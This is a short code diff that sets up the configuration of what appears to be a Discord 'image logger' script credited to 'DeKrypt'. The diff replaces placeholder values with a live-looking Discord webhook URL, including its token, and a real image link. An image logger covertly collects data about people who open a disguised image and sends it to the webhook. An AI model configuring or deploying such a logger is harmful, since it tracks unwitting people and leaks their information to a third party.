@@ -12,8 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/your/webhook",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1334948284036284436/w_3UCMhTGEFE-ZCzd6w035DffSezVyCSGiT6bUzl6hTZnSSrnfkXLMMwY-qgSLA8za41",
+    "image": "https://us-tuna-sounds-images.voicemod.net/5f7f118d-4e6c-457f-9640-39504cee7faf-1737831507057.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
